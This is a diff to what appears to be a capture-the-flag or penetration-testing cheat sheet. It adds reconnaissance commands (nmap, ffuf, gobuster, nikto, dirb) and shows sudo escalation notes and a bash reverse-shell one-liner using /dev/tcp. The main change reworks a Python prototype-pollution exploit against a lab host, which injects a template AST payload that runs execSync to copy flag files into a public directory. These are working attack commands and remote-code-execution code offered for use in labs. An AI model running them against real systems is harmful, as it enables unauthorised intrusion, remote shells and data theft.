@@ -9,7 +9,32 @@
 - [Crypto Chef](https://gchq.github.io/CyberChef/)
 
  
-### Sudo basic escalation
+ ### nmap 👁️
+```shell
+nmap -sC -A -T4 <ip>
+```
+
+### ffuf 🌩️
+```shell
+ffuf -u http://<url>/FUZZ -w /usr/share/wordlists/dirb/common.txt
+```
+
+### gobuster
+```shell
+gobuster dir -u http://<url> -w /usr/share/wordlists/dirb/common.txt
+```
+
+### Nikto
+```shell
+nikto -host <ip>
+```
+
+### dirb
+```shell
+dirb <url> /usr/share/wordlists/dirb/common.txt
+```
+ 
+### Basic sudo escalation
 ```
 sudo -l
 sudo -u theuser <app>
@@ -41,15 +66,7 @@ Client
 # or
 bash -c "bash -i >& /dev/tcp/127.0.0.1/444 0>&1"
 ```
-### nmap
-```shell
-nmap -sC -A -T4 <ip>
-```
 
-### dirb
-```shell
-dirb <url> /usr/share/wordlists/dirb/common.txt
-```
 
 ### Metasploit basic usage
 ```shell
@@ -87,7 +104,7 @@ import requests
 
 TARGET_URL = 'http://10.10.12.14:8713'
 
-requests.post(TARGET_URL + '/submit', json = {
+r1 = requests.post(TARGET_URL + '/submit', json = {
     "__proto__.type": "Program",
     "__proto__.body": [{
         "type": "MustacheStatement",
@@ -103,10 +120,17 @@ requests.post(TARGET_URL + '/submit', json = {
     }]
 })
 
-print()
+print(r1._content)
 
-# execute
-requests.get(TARGET_URL)
+
+r2 = requests.post(TARGET_URL + '/submit', json = {
+    "__proto__.block": {
+        "type": "Text", 
+        "line": "process.mainModule.require('child_process').execSync(`cat flag* >> ./static/file.txt`)"
+    }
+})
+
+print(r2._content)
 ```
 
 ### Basic SMTP enum (Python)
